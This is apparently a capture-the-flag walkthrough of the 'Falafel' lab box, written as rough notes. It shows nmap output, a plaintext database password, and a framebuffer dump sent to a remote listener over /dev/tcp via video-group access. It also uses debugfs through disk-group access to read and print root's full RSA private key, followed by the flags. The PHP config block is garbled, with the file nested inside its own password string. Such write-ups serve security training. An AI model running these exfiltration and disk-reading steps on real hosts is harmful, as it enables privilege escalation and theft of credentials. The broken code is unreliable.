# Falafel

# keyword 

 md5 for 0e , video privilege,  disk privilege



# information

Nmap 7.70 scan initiated Mon Apr  1 15:01:15 2019 as: nmap -sC -sV -oA nmap 10.10.10.73

Nmap scan report for 10.10.10.73
Host is up (0.30s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)
|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)
|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/*.txt
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Falafel Lovers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# connect db info

```php
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', '<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>
');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>
```

#  vedio privilege

uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)

```bash
moshe@falafel:~$ ls -al /dev/fb*
crw-rw---- 1 root video 29, 0 Apr  1 00:40 /dev/fb0
moshe@falafel:~$ id
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
moshe@falafel:/sys$ find . | grep fb
./bus/acpi/devices/device:fb
./devices/pci0000:00/0000:00:0f.0/graphics/fb0
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/dev
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/pan
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/name
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/mode
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/console
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/blank
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/modes
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/power
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/power/control
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/power/async
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/power/runtime_enabled
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/power/runtime_active_kids
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/power/runtime_active_time
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/power/autosuspend_delay_ms
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/power/runtime_status
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/power/runtime_usage
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/power/runtime_suspended_time
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/state
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/bl_curve
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/bits_per_pixel
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/device
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/cursor
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/subsystem
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/rotate
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/stride
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/uevent
./devices/pci0000:00/0000:00:0f.0/graphics/fb0/virtual_size

```

# fb0   information



moshe@falafel:/sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0$ cat virtual_size
1176,885
moshe@falafel:/sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0$

moshe@falafel:/sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0$ cat /dev/fb0 > /dev/tcp/10.10.14.27/9001  

#  gnu image open raw

moshe@falafel:/sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0$ cat virtual_size
1176,885

file->raw image -> MoshePlzStopHackingMe!

# disk privlege

yossi@falafel:~$ id
uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)
yossi@falafel:~$ crontab -l
no crontab for yossi

yossi@falafel:~$ id
uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)
yossi@falafel:~$ crontab -l
no crontab for yossi

```bash
yossi@falafel:~$ ls /dev/sd*
/dev/sda  /dev/sda1  /dev/sda2  /dev/sda5
yossi@falafel:~$ ls -al /dev/sda*
brw-rw---- 1 root disk 8, 0 Apr  1 00:40 /dev/sda
brw-rw---- 1 root disk 8, 1 Apr  1 00:40 /dev/sda1
brw-rw---- 1 root disk 8, 2 Apr  1 00:40 /dev/sda2
brw-rw---- 1 root disk 8, 5 Apr  1 00:40 /dev/sda5
yossi@falafel:~$ /sbin/debugfs -h
debugfs 1.42.13 (17-May-2015)
/sbin/debugfs: invalid option -- 'h'
/sbin/debugfs: Usage: debugfs [-b blocksize] [-s superblock] [-f cmd_file] [-R request] [-V] [[-w] [-c] device]
yossi@falafel:~$
yossi@falafel:~$ /sbin/debugfs /dev/sda1
debugfs 1.42.13 (17-May-2015)
debugfs:  cd  /root
debugfs:  ls
debugfs:  cd .ssh
debugfs:  ls
debugfs:  cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyPdlQuyVr/L4xXiDVK8lTn88k4zVEEfiRVQ1AWxQPOHY7q0h
b+Zd6WPVczObUnC+TaElpDXhf3gjLvjXvn7qGuZekNdB1aoWt5IKT90yz9vUx/gf
v22+b8XdCdzyXpJW0fAmEN+m5DAETxHDzPdNfpswwYpDX0gqLCZIuMC7Z8D8Wpkg
BWQ5RfpdFDWvIexRDfwj/Dx+tiIPGcYtkpQ/UihaDgF0gwj912Zc1N5+0sILX/Qd
UQ+ZywP/qj1FI+ki/kJcYsW/5JZcG20xS0QgNvUBGpr+MGh2urh4angLcqu5b/ZV
dmoHaOx/UOrNywkp486/SQtn30Er7SlM29/8PQIDAQABAoIBAQCGd5qmw/yIZU/1
eWSOpj6VHmee5q2tnhuVffmVgS7S/d8UHH3yDLcrseQhmBdGey+qa7fu/ypqCy2n
gVOCIBNuelQuIAnp+EwI+kuyEnSsRhBC2RANG1ZAHal/rvnxM4OqJ0ChK7TUnBhV
+7IClDqjCx39chEQUQ3+yoMAM91xVqztgWvl85Hh22IQgFnIu/ghav8Iqps/tuZ0
/YE1+vOouJPD894UEUH5+Bj+EvBJ8+pyXUCt7FQiidWQbSlfNLUWNdlBpwabk6Td
OnO+rf/vtYg+RQC+Y7zUpyLONYP+9S6WvJ/lqszXrYKRtlQg+8Pf7yhcOz/n7G08
kta/3DH1AoGBAO0itIeAiaeXTw5dmdza5xIDsx/c3DU+yi+6hDnV1KMTe3zK/yjG
UBLnBo6FpAJr0w0XNALbnm2RToX7OfqpVeQsAsHZTSfmo4fbQMY7nWMvSuXZV3lG
ahkTSKUnpk2/EVRQriFjlXuvBoBh0qLVhZIKqZBaavU6iaplPVz72VvLAoGBANj0
GcJ34ozu/XuhlXNVlm5ZQqHxHkiZrOU9aM7umQkGeM9vNFOwWYl6l9g4qMq7ArMr
5SmT+XoWQtK9dSHVNXr4XWRaH6aow/oazY05W/BgXRMxolVSHdNE23xuX9dlwMPB
f/y3ZeVpbREroPOx9rZpYiE76W1gZ67H6TV0HJcXAoGBAOdgCnd/8lAkcY2ZxIva
xsUr+PWo4O/O8SY6vdNUkWIAm2e7BdX6EZ0v75TWTp3SKR5HuobjVKSht9VAuGSc
HuNAEfykkwTQpFTlmEETX9CsD09PjmsVSmZnC2Wh10FaoYT8J7sKWItSzmwrhoM9
BVPmtWXU4zGdST+KAqKcVYubAoGAHR5GBs/IXFoHM3ywblZiZlUcmFegVOYrSmk/
k+Z6K7fupwip4UGeAtGtZ5vTK8KFzj5p93ag2T37ogVDn1LaZrLG9h0Sem/UPdEz
HW1BZbXJSDY1L3ZiAmUPgFfgDSze/mcOIoEK8AuCU/ejFpIgJsNmJEfCQKfbwp2a
M05uN+kCgYBq8iNfzNHK3qY+iaQNISQ657Qz0sPoMrzQ6gAmTNjNfWpU8tEHqrCP
NZTQDYCA31J/gKIl2BT8+ywQL50avvbxcXZEsy14ExVnaTpPQ9m2INlxz97YLxjZ
FEUbkAlzcvN/S3LJiFbnkQ7uJ0nPj4oPw1XBcmsQoBwPFOcCEvHSrg==
-----END RSA PRIVATE KEY-----
debugfs:

```

root@falafel:~# cat root.txt
23b79200448c62ffd6f8f2091c001fa1
root@falafel:~# cat /home/moshe/user.txt
c866575ed5999e1a878b1494fcb1f9d3